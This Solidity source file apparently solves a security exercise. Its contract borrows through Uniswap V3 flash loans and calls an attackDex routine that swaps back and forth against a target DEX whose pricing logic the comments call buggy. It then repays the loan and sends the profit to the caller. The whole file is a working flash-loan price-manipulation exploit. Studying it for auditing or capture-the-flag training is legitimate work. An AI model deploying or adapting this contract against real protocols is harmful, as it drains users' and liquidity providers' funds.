// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.13;

import {IDex} from "./interfaces/IDex.sol";
import {console2 as console} from "forge-std/Test.sol";
import {IFlashLoan} from "./interfaces/IFlashLoan.sol";
import {SafeTransferLib, ERC20} from "solmate/utils/SafeTransferLib.sol";
import {IUniswapV3FlashCallback} from "./interfaces/IUniswapV3FlashCallback.sol";
import {CallbackValidation, PoolAddress, IUniswapV3Pool} from "./lib/CallbackValidation.sol";

/// @title Multiply Flash Contract Implementation
/// @notice Contract is used to take flash loan from Uniswap V3 flash function and,
///         take funds from a Dex buggy price logic.
/// @author c-n-o-t-e

contract FlashLoan is IUniswapV3FlashCallback, IFlashLoan {
    address public immutable factory;
    address public immutable WETH9;

    address constant UNISWAP_TOKEN = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    constructor(address _factory, address _WETH9) {
        factory = _factory;
        WETH9 = _WETH9;
    }

    function attackDex(IDex dex, address from) private {
        uint amount;

        ERC20(from).approve(address(dex), 100000 ether);
        ERC20(UNISWAP_TOKEN).approve(address(dex), 100000 ether);

        amount = ERC20(from).balanceOf(address(this));
        dex.swap(from, UNISWAP_TOKEN, amount);

        amount = ERC20(UNISWAP_TOKEN).balanceOf(address(this));
        dex.swap(UNISWAP_TOKEN, from, amount);
    }

    /// @inheritdoc IUniswapV3FlashCallback
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external override {
        FlashCallbackData memory decoded = abi.decode(
            data,
            (FlashCallbackData)
        );

        CallbackValidation.verifyCallback(factory, decoded.poolKey);

        address token0 = decoded.poolKey.token0;
        address token1 = decoded.poolKey.token1;

        // amount borrowed must be paid with fees
        uint256 amount0Min = decoded.amount0 + fee0;
        uint256 amount1Min = decoded.amount1 + fee1;

        address token;
        uint256 amount;

        // gets the token granted loan and flashloan amount with fee
        decoded.amount0 > 0
            ? (token, amount) = (token0, amount0Min)
            : (token, amount) = (token1, amount1Min);

        attackDex(IDex(decoded.dex), token);

        uint256 contractBalanceAfterAttack = ERC20(token).balanceOf(
            address(this)
        );

        // pay the required amounts back to the pair
        SafeTransferLib.safeTransfer(ERC20(token), msg.sender, amount);

        // if profitable pay profits to payer
        if (contractBalanceAfterAttack > amount) {
            uint256 profit0 = contractBalanceAfterAttack - amount;
            SafeTransferLib.safeTransfer(ERC20(token), decoded.payer, profit0);
        }
    }

    /// @inheritdoc IFlashLoan
    function initFlash(FlashParams[] memory params) public {
        for (uint256 i; i < params.length; ++i) {
            PoolAddress.PoolKey memory poolKey = PoolAddress.PoolKey({
                token0: params[i].token0,
                token1: params[i].token1,
                fee: params[i].fee1
            });

            IUniswapV3Pool pool = IUniswapV3Pool(
                PoolAddress.computeAddress(factory, poolKey)
            );

            pool.flash(
                address(this),
                params[i].amount0,
                params[i].amount1,
                abi.encode(
                    FlashCallbackData({
                        amount0: params[i].amount0,
                        amount1: params[i].amount1,
                        payer: msg.sender,
                        poolKey: poolKey,
                        dex: params[i].dex
                    })
                )
            );
        }
    }
}
